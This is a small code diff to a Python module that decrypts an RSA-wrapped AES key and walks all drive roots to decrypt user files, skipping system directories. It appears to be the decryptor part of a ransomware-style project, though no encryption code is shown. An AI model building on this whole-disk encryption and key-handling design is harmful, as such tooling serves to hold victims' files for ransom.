@@ -5,6 +5,7 @@ from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.primitives import padding as sym_padding
 from cryptography.hazmat.backends import default_backend
 from RSA_Key_Handling import fetch_and_load_private_key
+from Driver_Handling import root_paths
 from Variables import system_dirs
 
 ####################################################################################################################
@@ -45,7 +46,8 @@ def decrypt_file_with_aes(file_path, key):
 
 ####################################################################################################################
 
-def decrypt_user_files(root_path, aes_key):
+def decrypt_user_files(aes_key):
+    root_path = root_paths()
     script_dir = os.path.dirname(os.path.abspath(__file__))  # Get the scripts directory
 
     for root, dirs, files in os.walk(root_path):
@@ -69,6 +71,6 @@ def decrypt_all_files():
     encrypted_aes_key = load_encrypted_aes_key()
     aes_key = decrypt_aes_key_with_rsa(encrypted_aes_key, private_key)
 
-    decrypt_user_files("/", aes_key)
+    decrypt_user_files(aes_key)
 
 ####################################################################################################################
